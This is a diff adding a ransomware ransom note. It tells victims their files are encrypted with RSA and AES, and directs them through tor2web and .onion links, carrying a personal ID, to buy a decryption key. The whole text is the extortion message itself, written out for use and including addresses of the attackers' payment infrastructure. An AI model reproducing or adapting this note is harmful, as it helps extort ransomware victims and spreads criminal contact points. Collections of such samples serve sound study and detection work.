@@ -1,0 +1,21 @@
+﻿            !!! IMPORTANT INFORMATION !!!!
+
+All of your files are encrypted with RSA-2048 and AES-128 ciphers.
+More information about the RSA and AES can be found here:
+    https://en.wikipedia.org/wiki/RSA_(cryptosystem)
+    https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
+    
+Decrypting of your files is only possible with the private key and decrypt program, which is on our secret server.
+To receive your private key follow one of the links:
+    1. http://6dtxgqam4crv6rr6.tor2web.org/4EA6E38CA7662BC9
+    2. http://6dtxgqam4crv6rr6.onion.to/4EA6E38CA7662BC9
+    3. http://6dtxgqam4crv6rr6.onion.cab/4EA6E38CA7662BC9
+    4. http://6dtxgqam4crv6rr6.onion.link/4EA6E38CA7662BC9
+
+If all of this addresses are not available, follow these steps:
+    1. Download and install Tor Browser: https://www.torproject.org/download/download-easy.html
+    2. After a successful installation, run the browser and wait for initialization.
+    3. Type in the address bar: 6dtxgqam4crv6rr6.onion/4EA6E38CA7662BC9 
+    4. Follow the instructions on the site.
+
+!!! Your personal identification ID: 4EA6E38CA7662BC9 !!!
